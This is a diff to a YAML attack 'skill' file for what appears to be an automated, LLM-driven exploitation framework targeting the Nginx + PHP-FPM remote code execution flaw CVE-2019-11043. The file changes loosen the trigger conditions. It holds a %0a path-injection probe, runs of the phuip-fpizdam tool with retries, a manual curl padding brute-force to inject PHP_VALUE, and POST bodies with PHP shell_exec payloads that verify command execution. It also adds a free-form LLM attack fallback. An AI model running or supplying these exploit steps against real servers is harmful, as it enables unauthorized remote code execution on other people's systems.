@@ -1,142 +1,275 @@
 # ═══════════════════════════════════════════════════════════
 # PHP-FPM CVE-2019-11043 — Nginx + PHP-FPM RCE
 #
-# v2: 使用 phuip-fpizdam 工具（https://github.com/neex/phuip-fpizdam）
-#     替代手工 QSL 爆破
+# 根因修复:
+#   原版所有 exploit_paths 要求 nginx_confirmed: true
+#   但靶场经常不暴露 Nginx 响应头 → 条件永远不满足 → 利用不执行
+#
+#   修复: 用 %0a 路径注入行为（502 响应）作为主条件
+#   这才是 CVE-2019-11043 的本质特征，与响应头无关
 # ═══════════════════════════════════════════════════════════
 skill_id: php_fpm_rce
 name: "PHP-FPM Nginx 缓冲区溢出 RCE (CVE-2019-11043)"
 category: web_rce
-version: "2.0"
+version: "3.0"
 
 principle: |
   Nginx + PHP-FPM 配置中使用 fastcgi_split_path_info 时，
-  特定 URL 路径导致 env_path_info 下溢，可注入 PHP_VALUE
+  特定 URL 路径（含 %0a）导致 env_path_info 下溢，可注入 PHP_VALUE
   覆盖 php.ini 配置（如 auto_prepend_file=php://input），
   使后续 POST body 被当作 PHP 代码执行。
 
   phuip-fpizdam 工具自动完成 QSL 探测和 payload 注入。
   注入后任何 PHP 请求的 POST body 都会被执行（但只影响部分 worker）。
 
+  检测特征: /index.php/%0a 返回 502（正常请求返回 200）
+
 match:
   rules:
-    - fingerprint_contains: ["nginx", "php"]
-    - fingerprint_contains: ["php-fpm"]
-    - evidence_contains: ["php-fpm", "CVE-2019-11043"]
-    - evidence_contains: ["nginx", "php"]
     - cve_matches: ["CVE-2019-11043"]
+    - fingerprint_contains: ["php-fpm"]
+    - fingerprint_contains: ["PHP-FPM"]
+    - evidence_contains: ["php-fpm", "CVE-2019-11043"]
+    - evidence_contains: ["cve-direct-check"]
 
 probes:
-  - id: confirm_env
-    description: "确认 Nginx + PHP 环境"
-    steps:
-      - command: |
-          resp=$(curl -s -D - {ENDPOINT}/index.php --max-time 10 2>/dev/null)
-          echo "$resp" | head -30
-          if echo "$resp" | grep -qi "nginx"; then echo "NGINX_CONFIRMED"; fi
-          if echo "$resp" | grep -qi "X-Powered-By.*PHP\|PHP/"; then echo "PHP_CONFIRMED"; fi
-          # 测试 PATH_INFO
-          code=$(curl -s -o /dev/null -w "%{http_code}" "{ENDPOINT}/index.php/test" --max-time 8 2>/dev/null)
-          echo "PATHINFO_STATUS:${code}"
-          if [ "$code" != "000" ] && [ "$code" != "403" ]; then echo "PATHINFO_WORKS"; fi
-        parse_rules:
-          - if_contains: ["NGINX_CONFIRMED"]
-            set: { nginx_confirmed: true }
-          - if_contains: ["PHP_CONFIRMED"]
-            set: { php_confirmed: true }
-          - if_contains: ["PATHINFO_WORKS"]
-            set: { pathinfo_works: true }
+  # 探测 1: 直接检测 %0a 路径注入行为（检查响应体，不只看状态码）
+  - id: check_0a_anomaly
+    description: "检测 /index.php/%0a 路径注入异常（CVE-2019-11043 本质特征）"
+    command: |
+      echo "=== 基线请求 ==="
+      baseline=$(curl -s -w "\n%{http_code}" "{ENDPOINT}/index.php" --max-time 8 2>/dev/null)
+      baseline_code=$(echo "$baseline" | tail -1)
+      baseline_body=$(echo "$baseline" | sed '$d')
+      baseline_len=${#baseline_body}
+      echo "BASELINE: code=$baseline_code len=$baseline_len"
+
+      echo "=== %0a 注入请求 ==="
+      anomaly=$(curl -s -w "\n%{http_code}" "{ENDPOINT}/index.php/%0a" --max-time 8 2>/dev/null)
+      anomaly_code=$(echo "$anomaly" | tail -1)
+      anomaly_body=$(echo "$anomaly" | sed '$d')
+      anomaly_len=${#anomaly_body}
+      echo "ANOMALY: code=$anomaly_code len=$anomaly_len"
+      echo "ANOMALY_BODY: $anomaly_body"
+
+      # 判定 1: 502/500 状态码
+      if [ "$anomaly_code" = "502" ] || [ "$anomaly_code" = "500" ]; then
+        echo "FPM_VULNERABLE_CONFIRMED"
+        exit 0
+      fi
+
+      # 判定 2: FPM 特征错误消息
+      anomaly_lower=$(echo "$anomaly_body" | tr '[:upper:]' '[:lower:]')
+      if echo "$anomaly_lower" | grep -qE "file not found|no input file specified|primary script unknown"; then
+        echo "FPM_VULNERABLE_CONFIRMED"
+        exit 0
+      fi
+
+      # 判定 3: 状态码差异
+      if [ "$anomaly_code" != "$baseline_code" ] && [ "$anomaly_code" != "404" ] && [ -n "$anomaly_code" ] && [ "$anomaly_code" != "000" ]; then
+        echo "FPM_VULNERABLE_LIKELY"
+        exit 0
+      fi
+
+      # 判定 4: body 长度剧变
+      if [ "$baseline_len" -gt 100 ] && [ "$anomaly_len" -lt 50 ]; then
+        echo "FPM_VULNERABLE_LIKELY"
+        exit 0
+      fi
+
+      echo "FPM_NOT_VULNERABLE"
+    timeout: 30
+    parse_rules:
+      - if_contains: ["FPM_VULNERABLE_CONFIRMED"]
+        set: { fpm_vulnerable: true }
+      - if_contains: ["FPM_VULNERABLE_LIKELY"]
+        set: { fpm_likely: true }
+
+  # 探测 2: 检查 phuip-fpizdam 是否可用
+  - id: check_phuip
+    description: "检查 phuip-fpizdam 工具"
+    command: |
+      if command -v phuip-fpizdam >/dev/null 2>&1; then
+        echo "PHUIP_AVAILABLE"
+      elif [ -x /opt/phuip-fpizdam ]; then
+        echo "PHUIP_AVAILABLE"
+      else
+        echo "PHUIP_MISSING"
+      fi
+    timeout: 5
+    parse_rules:
+      - if_contains: ["PHUIP_AVAILABLE"]
+        set: { phuip_available: true }
+      - if_contains: ["PHUIP_MISSING"]
+        set: { phuip_available: false }
 
 exploit_paths:
-  # ═══ 路径 A: phuip-fpizdam 自动利用 ═══
-  - path_id: phuip_fpizdam
+  # ═══ 路径 A: phuip-fpizdam 自动利用（已确认漏洞 + 工具可用） ═══
+  - path_id: phuip_confirmed
     name: "phuip-fpizdam 自动利用"
     priority: 1
-    principle: |
-      phuip-fpizdam 自动完成 QSL 探测和 PHP_VALUE 注入。
-      成功后输出 "Attack params found" 或 "Success"。
-      注入后需要多次发送 POST 请求命中被污染的 worker 来验证 RCE。
     conditions:
-      nginx_confirmed: true
+      fpm_vulnerable: true
+      phuip_available: true
     steps:
       - id: run_fpizdam
-        description: "phuip-fpizdam 探测并注入"
+        description: "运行 phuip-fpizdam 注入 PHP_VALUE"
         command: |
-          echo "[*] 运行 phuip-fpizdam..."
-          # 运行工具（可能需要多次尝试）
-          output=$(/opt/phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
+          echo "[*] phuip-fpizdam 注入..."
+          output=$(phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
           echo "$output"
-
           if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
-            echo "FPIZDAM_INJECT_SUCCESS"
+            echo "FPIZDAM_SUCCESS"
           fi
         timeout: 120
         success_criteria:
-          stdout_contains_any: ["FPIZDAM_INJECT_SUCCESS", "Success", "Was able to execute"]
+          stdout_contains_any: ["FPIZDAM_SUCCESS", "Success", "Was able to execute"]
         on_success: verify_rce
         on_fail: fpizdam_retry
-        evidence_capture:
-          shell_type: "rce_php_fpm_fpizdam"
 
       - id: fpizdam_retry
-        description: "重试 phuip-fpizdam（有时需要多次）"
+        description: "phuip-fpizdam 重试（有时需要多次）"
         command: |
           for attempt in 1 2 3; do
             echo "[*] phuip-fpizdam 重试 #$attempt..."
-            output=$(/opt/phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
+            output=$(phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
             echo "$output"
             if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
-              echo "FPIZDAM_INJECT_SUCCESS"
+              echo "FPIZDAM_SUCCESS"
               break
             fi
             sleep 2
           done
         timeout: 300
         success_criteria:
-          stdout_contains_any: ["FPIZDAM_INJECT_SUCCESS", "Success", "Was able to execute"]
+          stdout_contains_any: ["FPIZDAM_SUCCESS", "Success", "Was able to execute"]
         on_success: verify_rce
         on_fail: next_path
 
       - id: verify_rce
-        description: "验证 RCE — 多次发送 POST 命中被污染的 worker"
+        description: "多次 POST 命中被污染的 worker 验证 RCE"
         command: |
-          echo "[*] 验证 RCE（多次尝试命中被污染的 worker）..."
-          for i in $(seq 1 30); do
+          echo "[*] 验证 RCE..."
+          for i in $(seq 1 50); do
             result=$(curl -s -X POST "{ENDPOINT}/index.php?a=id" \
-              -d "<?php echo 'PHP_FPM_RCE_' . shell_exec('id'); ?>" \
+              -d "<?php echo 'FPM_RCE_' . shell_exec('id'); ?>" \
               --max-time 5 2>/dev/null)
             if echo "$result" | grep -q "uid="; then
-              echo "[+] 命中！"
+              echo "[+] POST body 命中"
               echo "$result"
-              echo "PHP_FPM_RCE_CONFIRMED"
+              echo "PHP_FPM_RCE_OK"
               exit 0
             fi
-            # 也试 phuip-fpizdam 注入后的参数方式
             result2=$(curl -s "{ENDPOINT}/index.php?a=/bin/sh+-c+id" --max-time 5 2>/dev/null)
             if echo "$result2" | grep -q "uid="; then
-              echo "[+] 参数方式命中！"
+              echo "[+] 参数方式命中"
               echo "$result2"
-              echo "PHP_FPM_RCE_CONFIRMED"
+              echo "PHP_FPM_RCE_OK"
+              exit 0
+            fi
+          done
+          echo "VERIFY_FAILED"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "PHP_FPM_RCE_OK"]
+        on_success: conclude_success
+        on_fail: conclude_fail
+        evidence_capture:
+          shell_type: "rce_php_fpm"
+          current_user: stdout
+
+  # ═══ 路径 B: 疑似漏洞时尝试 phuip-fpizdam ═══
+  - path_id: phuip_likely
+    name: "phuip-fpizdam 探索（疑似漏洞）"
+    priority: 2
+    conditions:
+      fpm_likely: true
+      phuip_available: true
+    skip_if:
+      fpm_vulnerable: true
+    steps:
+      - id: explore_fpizdam
+        description: "用 phuip-fpizdam 探测"
+        command: |
+          echo "[*] 探索模式 phuip-fpizdam..."
+          output=$(phuip-fpizdam "{ENDPOINT}/index.php" 2>&1)
+          echo "$output"
+          if echo "$output" | grep -qi "Success\|Attack params found\|Was able to execute"; then
+            echo "FPIZDAM_SUCCESS"
+          fi
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["FPIZDAM_SUCCESS", "Success", "Was able to execute"]
+        on_success: explore_verify
+        on_fail: next_path
+
+      - id: explore_verify
+        description: "验证 RCE"
+        command: |
+          for i in $(seq 1 30); do
+            result=$(curl -s -X POST "{ENDPOINT}/index.php?a=id" \
+              -d "<?php echo shell_exec('id'); ?>" \
+              --max-time 5 2>/dev/null)
+            if echo "$result" | grep -q "uid="; then
+              echo "$result"
+              echo "PHP_FPM_RCE_OK"
               exit 0
             fi
           done
           echo "VERIFY_FAILED"
         timeout: 90
         success_criteria:
-          stdout_contains_any: ["uid=", "PHP_FPM_RCE_CONFIRMED"]
+          stdout_contains_any: ["uid=", "PHP_FPM_RCE_OK"]
         on_success: conclude_success
-        on_fail: conclude_success
+        on_fail: next_path
         evidence_capture:
           shell_type: "rce_php_fpm"
 
-  # ═══ 路径 B: LLM 兜底 ═══
+  # ═══ 路径 C: 无 phuip-fpizdam 时手动利用 ═══
+  - path_id: manual_exploit
+    name: "手动 curl 暴力注入"
+    priority: 3
+    conditions:
+      fpm_vulnerable: true
+    skip_if:
+      phuip_available: true
+    steps:
+      - id: manual_inject
+        description: "手动发送大量 %0a 请求尝试注入 PHP_VALUE"
+        command: |
+          echo "[*] 手动 QSL 暴力注入..."
+          for qsl in $(seq 1750 5 1850); do
+            padding=$(python3 -c "print('A' * $qsl)")
+            curl -s "{ENDPOINT}/index.php/${padding}%0a" \
+              --max-time 3 > /dev/null 2>&1
+          done
+          sleep 1
+          echo "[*] 尝试验证..."
+          for i in $(seq 1 30); do
+            result=$(curl -s -X POST "{ENDPOINT}/index.php" \
+              -d "<?php echo shell_exec('id'); ?>" \
+              --max-time 3 2>/dev/null)
+            if echo "$result" | grep -q "uid="; then
+              echo "$result"
+              echo "MANUAL_RCE_OK"
+              exit 0
+            fi
+          done
+          echo "MANUAL_FAILED"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "MANUAL_RCE_OK"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_php_fpm_manual"
+
+  # ═══ 路径 D: LLM 兜底（不再要求 nginx_confirmed） ═══
   - path_id: llm_freeform
-    name: "LLM 自由推理（限定 PHP-FPM 范围）"
+    name: "LLM 推理（限定 PHP-FPM 范围）"
     priority: 99
     mode: react_freeform
     max_rounds: 5
-    conditions:
-      nginx_confirmed: true
 
 remediation: |
   1. 升级 PHP 至 7.1.33 / 7.2.24 / 7.3.11 或更高版本
